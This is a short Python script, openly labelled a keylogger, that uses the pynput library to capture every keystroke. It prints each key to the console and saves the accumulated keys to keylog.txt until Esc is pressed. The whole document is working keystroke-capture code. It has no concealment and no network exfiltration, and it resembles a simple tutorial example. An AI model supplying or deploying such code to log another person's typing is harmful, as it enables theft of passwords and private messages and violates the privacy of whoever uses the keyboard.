# keylogger using pynput module

import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
	
	keys.append(key)
	write_file(keys)
	
	try:
		print('alphanumeric key {0} pressed'.format(key.char))
		
	except AttributeError:
		print('special key {0} pressed'.format(key))
		
def write_file(keys):
	
	with open('keylog.txt', 'w') as f:
		for key in keys:
			k = str(key).replace("'", "")
			f.write(k)
			f.write(' ')
			
def on_release(key):
	if key == Key.esc:
		# Stop listener
		return False


with Listener(on_press = on_press,
			on_release = on_release) as listener:
					
	listener.join()